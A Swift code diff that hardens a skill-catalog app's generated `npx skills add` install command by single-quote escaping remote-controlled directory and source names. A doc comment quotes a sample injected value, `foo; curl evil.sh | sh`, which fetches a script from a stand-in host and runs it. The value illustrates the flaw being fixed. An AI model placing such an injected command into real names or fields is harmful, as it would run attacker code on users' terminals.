@@ -110,8 +110,30 @@ public struct CatalogSkill: Identifiable, Hashable, Sendable {
     /// Install command for the ecosystem's own CLI (vercel-labs/skills,
     /// syntax verified against its docs: `npx skills add <owner/repo>
     /// --skill <name>`). The app copies this string; it never runs it.
+    ///
+    /// `name` (and, for custom sources, `sourceID`) is remote-controlled
+    /// — a catalog repository can name its directories anything git
+    /// allows. The command is what the user pastes into a terminal, so
+    /// any component outside the plain-token set is POSIX single-quote
+    /// escaped: `foo; curl evil.sh | sh` pastes as inert text, not code.
     public var installCommand: String {
-        "npx skills add \(sourceID) --skill \(name)"
+        "npx skills add \(Self.shellToken(sourceID)) --skill \(Self.shellToken(name))"
+    }
+
+    /// Characters a URL/GitHub token may contain without shell quoting.
+    /// Includes `/` for the owner/repo form of `sourceID`.
+    private static let plainTokenCharacters = Set(
+        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-/"
+    )
+
+    /// POSIX-safe single token: unquoted when the value is a plain token,
+    /// single-quoted otherwise (an embedded `'` closes the quote, escapes
+    /// itself, and reopens).
+    private static func shellToken(_ value: String) -> String {
+        guard !value.isEmpty, value.allSatisfy({ plainTokenCharacters.contains($0) }) else {
+            return "'" + value.replacingOccurrences(of: "'", with: "'\\''") + "'"
+        }
+        return value
     }
 
     public init(
